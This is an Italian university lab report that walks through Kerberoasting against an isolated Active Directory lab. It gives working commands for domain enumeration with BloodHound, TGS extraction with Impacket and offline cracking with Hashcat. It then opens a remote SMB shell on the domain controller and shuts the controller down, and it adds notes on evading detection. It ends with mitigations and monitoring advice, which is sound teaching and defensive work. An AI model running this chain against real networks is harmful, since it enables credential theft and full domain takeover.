# Steal or Forge Kerberos Tickets: Kerberoasting
## Giovanni Bernobic - Cybersecurity - A.a. 2025/2026
## Introduzione

Active Directory (AD) è il servizio di directory che gestisce identità, autenticazione e autorizzazioni nella stragrande maggioranza delle reti aziendali Windows. La sua centralità lo rende anche il bersaglio principale di un attaccante interno, infatti compromettere il Domain Controller (DC) equivale al controllo totale dell'organizzazione.

Questo report documenta una catena d'attacco completa contro un dominio AD allestito in laboratorio. Lo scenario parte da un foothold realistico, credenziali di un utente di dominio non privilegiato, plausibilmente ottenute tramite phishing e mostra come un attaccante possa, usando esclusivamente strumenti pubblici e funzionalità legittime del protocollo, mappare la struttura del dominio con BloodHound CE, identificare un account di servizio Kerberoastable, richiedere Ticket Granting Service per ognuno degli account di servizio trovati con Impacket, craccare offline il suo TGS con Hashcat e aprire una shell remota sul Domain Controller con Impacket.

La compromissione nasce dalla composizione del meccanismo del protocollo Kerberos (esso infatti concede TGS a qualunque utente autenticato), una misconfigurazione di priviegi (account di servizio con SPN e privilegi eccessivi) e una password debole.

## 2. Threat Model

**Punto di partenza**: credenziali in chiaro dell'utente di dominio `giovanni` (password `Password1!`) e connettività di rete verso il DC. Questo modella l'esito positivo di una campagna di phishing/spear-phishing.

**Obiettivo**: ottenere esecuzione di codice privilegiata sul Domain Controller `DC01.units.local`.

**Vincoli:** nessun accesso fisico, nessun privilegio amministrativo iniziale, nessun exploit di codice; tutto avviene rimanendo nei normali protocolli di dominio (SMB, LDAP, Kerberos).

**Mapping MITRE ATT\&CK:** Valid Accounts (T1078) → Discovery via LDAP → Kerberoasting (T1558.003) → Remote Code Execution via SMB.

## 3. Setup dell'ambiente

Il laboratorio è realizzato su **Oracle VirtualBox** con due macchine virtuali su una rete *Host-Only* isolata (`192.168.56.0/24`):

- **DC01**: Windows Server 2022, Domain Controller del dominio `units.local`, IP `192.168.56.10` (2 CPU, 4 GB RAM). Svolge anche il ruolo di server DNS, necessario per AD: senza i record SRV pubblicati dal DNS (`_kerberos._tcp.units.local`, `_ldap._tcp.dc._msdcs.units.local`), client e servizi non possono localizzare il DC.
- **KALI**: Kali Linux, macchina dell'attaccante, IP `192.168.56.20` (4 CPU, 6 GB RAM — più potenza per il cracking offline).

### 3.1 Setup Windows Server 2022

#### Nota teorica:
>
> I Service Principal Names (SPN) sono identificatori unici in Active Directory utilizzati per mappare le istanze di servizio agli account di servizio per l'autenticazione Kerberos. Un SPN è composto da più componenti che, combinati, forniscono un'identità completa per un servizio specifico (Classe, Hostname, Account, Porta)
>

Particolare attenzione alla configurazione dell'ambiente Windows e alla creazione degli utenti e gruppi al suo interno. 

Sul DC con il modulo Active Directory per Windows PowerShell sono stati creati:

- Utente foothold, di cui si sanno le credenziali: `giovanni`
  - ``` powershell
    New-ADUser -Name "Giovanni" -SamAccountName "giovanni" -AccountPassword (ConvertTo-SecureString "Password1!" -AsPlainText -Force) -Enabled $true
    ```

- Account di servizio vulnerabile nel gruppo degli amministratori di dominio (con massimi privilegi) a cui è associato un SPN: `svc_sql`

  - ``` powershell
    New-ADUser -Name "SQL Service" -SamAccountName "svc_sql" -AccountPassword (ConvertTo-SecureString "P4ssw0rd2!" -AsPlainText -Force) -Enabled $true
    ```
  - ``` powershell
    setspn -A MSSQL/DC01.units.local:1433 units\svc_sql
    ```

  - ``` powershell
    Add-ADGroupMember -Identity "Domain Admins" -Members "svc_sql"
    ```

- Altri utenti di contesto:
  - `Mario Rossi`
  - `Laura Bianchi`
  - `Luigi Verdi`
- Un altro account di servizio: `svc_web`
- Due gruppi di utenti:
  - IT Staff:
    - ``` powershell
      New-ADGroup -Name "IT Staff" -GroupScope Global -GroupCategory Security
      Add-ADGroupMember -Identity "IT Staff" -Members m.rossi, l.bianchi, l.verdi
      ```
    - `mario rossi`
    - `laura bianchi`
    - `luigi verdi`
  - Management:
    - `giovanni`

<br>


## 4. Verifica del foothold e sincronizzazione temporale

Prima di procedere viene effettuata la verifica della validità delle credenziali (opzionale); viene utilizzato **NetExec**, tool open-source che permette di effettuare scansioni e raccogliere informazioni usando molteplici protocolli, tra cui SMB (Server Message Block) e LDAP (Lightweitgh Directory Access Protocol):

``` bash
nxc smb 192.168.56.10 -u giovanni -p 'Password1!'
```
#### Nota:
> Il campo `smb` specifica che verrà usato il protocollo Server Message Block di Windows; alcuni sistemi di monitoraggio potrebbero riconoscere se la richiesta SMB proviene da un client legittimo o da uno strumento di testing come NetExec. In un vero attacco questo passaggio dovrebbe essere omesso per evitare di generare traffico inutile.

L'output conferma l'autenticazione riuscita e restituisce il nome NetBIOS del dominio e la versione del sistema operativo. Le credenziali non consentono accessi amministrativi, ma sono sufficienti per interrogare LDAP e richiedere ticket Kerberos.

Un passaggio tecnico critico è la sincronizzazione dell'orologio della macchina Kali con quello del DC: Kerberos rifiuta i ticket se lo skew temporale tra client e KDC supera 5 minuti (errore `KRB_AP_ERR_SKEW`). L'ora del DC viene letta tramite nmap e impostata sulla macchina attaccante con i seguenti comandi:

``` bash
DCTIME=$(nmap -sV -p 88 192.168.56.10 2>/dev/null | grep "server time" | grep -oP '\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}')

sudo date -u -s "$DCTIME"
```

## 5. Analisi del dominio con BloodHound CE e query LDAP

**BloodHound CE (Community Edition)** è uno strumento di graph-analysis usato per mappare in modo visivo e automatizzato le relazioni complesse all'interno di un ambiente Active Directory.
Sfruttando lo strumento `bloodhound-python` è possibile effettuare query LDAP standard verso il Domain Controller utilizzando le credenziali valide di un utente. 
Grazie all'ingente numero di query eseguite, l'ambiente Active Directory compreso di utenti, gruppi e sottogruppi viene mappato in un file JSON compresso in un archivio ZIP.
Sucessivamente questi dati vengono importati nell'interfaccia di BloodHound per essere elaborati e poter analizzare visivamente i percorsi d'attacco.

#### Nota teorica:
> Il protocollo LDAP (Lightweight Directory Access Protocol) è un protocollo software utilizzato per la comunicazione nei servizi di directory. Esso fornisce il linguaggio che le applicazioni utilizzano per comunicare tra loro nei servizi di directory. Una query LDAP è una richiesta ai servizi di directory per informazioni specifiche, ad esempio una richiesta per capire a quali gruppi è stato assegnato un utente. 


```bash
bloodhound-python -u giovanni -p 'Password1!' -d units.local \
  -ns 192.168.56.10 -c All --zip
```

Il flag `-c All` raccoglie tutti i metodi disponibili (GroupMembers, LocalAdmin, RDP, DCOM, LoggedOn, ObjectProps, ACL). Il flag `--zip` comprime i JSON in un unico archivio.

#### Nota:
> Il comando utilizzato genera un picco di traffico LDAP anomalo e una raffica di log sul DC, facilmente intercettabili da sistemi di monitoraggio come SIEM o EDR. In uno scenario reale un attaccante dovrebbe  usare query mirate, manuali e spalmate nel tempo.

![Traffico LDAP visto dal DC](/images/traffico%20ldap%20visto%20dal%20DC.png)

BloodHound CE viene avviato in Docker:

```bash
sudo ./bloodhound-cli start
```

Dopo l'upload dello ZIP all'interfaccia su `http://localhost:8080`, possono essere eseguite delle query precompilate. Due risultano interessanti:


**Query Cypher per utenti e gruppi**
``` cypher
MATCH p=(u:User)-[:MemberOf*1..]->(g:Group)
RETURN p LIMIT 1000 
```

![Bloodhoung grafo organizzazione](/images/bloodhound%20grafo.png)

**Query Cypher per account Kerberoastable:**

```cypher
MATCH (u:User)
WHERE u.hasspn = true AND u.enabled = true
AND NOT u.objectid ENDS WITH "-502"
AND NOT COALESCE(u.gsma, false) = true
AND NOT COALESCE(u.msa, false) = true
RETURN u LIMIT 100
```

Questa query restituisce `svc_sql` e `svc_web`: utenti abilitati, con SPN registrato, non sono né il KDC (objectid `-502`) né un Group Managed Service Account; entrambi candidati perfetti per Kerberoasting.

![Bloodhound Kerberoastable Users](/images/kerberoastable%20user.png)

## 6. Kerberoasting: estrazione e cracking del TGS

Il **Kerberoasting** sfrutta una caratteristica intrinseca del protocollo Kerberos: qualunque utente di dominio autenticato può richiedere al KDC un TGS per qualsiasi SPN registrato nel dominio. Il TGS è cifrato con l'hash della password dell'account associato a quell'SPN. L'hash può essere estratto e attaccato offline, senza generare ulteriore traffico verso il DC.

### 6.1 Richiesta del TGS con Impacket

**Impacket** è una raccolta di classi Python per l'interazione con i protocolli di rete Microsoft (SMB, NTLM, Kerberos). Lo strumento `GetUserSPNs` in particolare:

1. Si autentica come `giovanni` e ottiene un TGT dal KDC.
2. Interroga LDAP per trovare tutti gli account con `servicePrincipalName` non vuoto.
3. Per ciascuno di essi presenta il TGT e richiede il corrispondente TGS.
4. Salva gli hash nel file di output `hashes.txt`.

```bash
impacket-GetUserSPNs units.local/giovanni:'Password1!' \
  -dc-ip 192.168.56.10 -request -outputfile hashes.txt
```

Il file `hashes.txt` contiene gli hash nel formato Hashcat. Il prefisso identifica l'algoritmo:


`$krb5tgs$23$`: RC4-HMAC, hashcat mode 13100

`$krb5tgs$18$`: AES256, hashcat mode 19700


### 6.2 Cracking offline con Hashcat

Hashcat è uno dei migliori software open-source utilizzato per il cracking degli hash, grazie alla computazione parallela (GPGPU) può tentare elevatissimi numeri di password al secondo.
Hashcat supporta diverse strategie di attacco come:
- Attacco a dizionario
- Attacco con regole
- Forza bruta

Nel nostro caso verrà effettuato un attacco a dizionario `lista-pwd.txt` con un set di regole aggressivo `best66.rule`: per ogni password nel dizionario verranno eseguite 66 funzioni di mutazione, come l'aggiunta di un numero alla fine o rendere maiuscola la prima lettera.

```bash
hashcat -m 13100 -a 0 hashes.txt ./lista-pwd.txt \
  -r /usr/share/hashcat/rules/best66.rule --force
```

```bash
hashcat -m 13100 hashes.txt --show
```

#### Nota:
> Durante l'installazione di Hashcat vengono automaticamente scaricati anche numerosi dizionari con le password usate più frequentemente. Nel mio caso il dizionario `lista-pwd.txt` è stato costruito ad hoc per questo laboratorio e contiene 278 password.

![Hashcat exhausted](/images/hashcat%20exhausted.png)

Nonostante la scelta di una regola aggressiva come `best66.rule` lo status del cracking risulta `Exhausted`. Ora un attaccante può agire in diverse maniere:
- Cambiare dizionario (come ad esempio `rockyou.txt` che contiene più di 14 milioni di password)
- Cambiare regola di mutazione
- Cambiare entrambi

In questo caso è stata usata una diversa regola di mutazione: `dive.rule`, una delle più aggressive presenti su Hashcat.

``` bash
hashcat -m 13100 -a 0 hashes.txt ./lista-pwd.txt -r /usr/share/hashcat/rules/dive.rule --force
```

![Hashcat cracked](/images/hashcat%20cracked.png)

La password di `svc_sql` viene recuperata: `P4ssw0rd2!`.




## 7. Post-exploitation: shell remota sul Domain Controller

Con le credenziali di `svc_sql` in chiaro, l'attaccante può aprire una shell remota sul DC tramite impacket-smbexec:

```bash
impacket-smbexec units.local/svc_sql:'P4ssw0rd2!'@192.168.56.10
```

 Lo strumento `smbexec` si collega al computer bersaglio tramite il protocollo di rete SMB e crea un servizio di sistema temporaneo che lancia direttamente il prompt dei comandi nativo di Windows `cmd.exe`.
 Esso invia i comandi attraverso named pipe e rimuove il servizio dopo ogni risposta; tutto senza scrivere file persistenti sul disco. 
 Attraverso il comando `ipconfig` possiamo effetivamente vedere che l'indirizzo IP è proprio quello del DC, e con `whoami /groups` si può vedere come l'account di servizio `svc_sql` faccia parte del gruppo `Administrators`. 


![Impacket shell dentro DC](/images/Impacket%20shell%20dentro%20DC.png)


```bash
shutdown /s /t 0
```

Il Domain Controller si spegne: il dominio è compromesso.



## 8. Conclusioni e mitigazioni

L'attacco non ha richiesto exploit di codice né vulnerabilità zero-day. La compromissione è la composizione di tre elementi: (1) il protocollo Kerberos, concede TGS a qualunque utente autenticato; (2) un account utente con SPN registrato, condizione sufficiente per il Kerberoasting; (3) una password debole, craccabile offline. BloodHound ha reso visibile, in un unico grafo, ciò che in un'analisi manuale richiederebbe decine di query LDAP separate.

**Mitigazioni da tenere in considerazione:**

- **Group Managed Service Accounts (gMSA):** gli account utente standard con SPN associati sono un facile bersaglio di Kerberoasting; con i gMSA questo diventa totalmente inefficace a causa della complessità della password (240 caratteri) e dall'algoritmo di cifratura (AES-256).
- **AES-only:** deprecare RC4-HMAC e forzare la cifratura AES aumenterebbe  esponenzialmente il costo computazionale del cracking offline.
- **Principio del minimo privilegio:** un account di servizio SQL non deve essere Domain Admin ma avere solamente i privilegi necessari a funzionare correttamente.
- **Monitoring degli eventi LDAP**: come è stato fatto notare, l'uso di strumenti di testing come Impacket genera traffico facilmente intercettabile.
- **Monitoring dell'evento 4769:** ogni richiesta di TGS genera l'evento Windows Security 4769. Un utente che richiede TGS per molti SPN in rapida successione è un segnale Kerberoasting rilevabile facilmente. In questa demo ne vengono richiesti solamente due ma in un contesto aziendale i servizi potrebbero essere decine.
- **Monitoring dell'evento 7045:** dopo aver aperto la shell fittizia, ogni comando mandato alla macchina può essere intercettato attraverso l'evento 7045 di Windows, che rileva quando un nuovo servizio viene installato.

![Evento 7045 ipconfig](/images/evento%207045%20ipconfig.png)
![Evento 7045 whoami](/images/evento%207045%20whoami.png)



## Fonti

- SpecterOps, *BloodHound Community Edition — Quickstart*, [https://bloodhound.specterops.io/](https://bloodhound.specterops.io/)
- Impacket, repository ufficiale, [https://github.com/fortra/impacket](https://github.com/fortra/impacket)
- Impacket - Cheatsheet, [https://www.blackhillsinfosec.com/impacket-cheatsheet/](https://www.blackhillsinfosec.com/impacket-cheatsheet/)
- Hashcat, *Example Hashes e modalità di attacco*, [https://hashcat.net/wiki/](https://hashcat.net/wiki/)
- Microsoft Learn, *Active Directory Domain Services Overview, Identity and access*, [https://learn.microsoft.com/it-it/windows-server/identity/identity-and-access](https://learn.microsoft.com/it-it/windows-server/identity/identity-and-access)
- HackTricks, *Kerberoast*, [https://hacktricks.wiki/windows-hardening/active-directory-methodology/kerberoast.html](https://hacktricks.wiki/windows-hardening/active-directory-methodology/kerberoast.html)
- MITRE ATT&CK, T1558.003 *Steal or Forge Kerberos Tickets: Kerberoasting*, [https://attack.mitre.org/techniques/T1558/003/](https://attack.mitre.org/techniques/T1558/003/)
- Slide del corso: *620 — Authentication: NTLM/Kerberos*, *600 — Access Control: Organizations*, *650 — Techniques: Advanced*
- Kerberoasting Attack Simulation in Active Directory, [https://medium.com/@aradityaraj.07/kerberoasting-attack-simulation-in-active-directory-9b39fad6dacb](https://medium.com/@aradityaraj.07/kerberoasting-attack-simulation-in-active-directory-9b39fad6dacb)
- Guide To Active Directory Kerberosting With Kali Linux, [https://logos-red.com/blog/guide-to-active-directory-kerberosting-with-kali-linux/](https://logos-red.com/blog/guide-to-active-directory-kerberosting-with-kali-linux/)

<br><br><br><br><br>

### Nota all'uso di strumenti di intelligenza artificiale:
 Per la preparazione di questo progetto è stato fatto uso di **Gemini** (Google DeepMind) come strumento di supporto alla raccolta di informazioni. In particolare, l'LLM è stato impiegato per orientarsi nella documentazione pubblica disponibile, siti web, articoli tecnici e video, relativa alla configurazione di un ambiente Active Directory in VirtualBox e alla comprensione del flusso di autenticazione Kerberos.
 


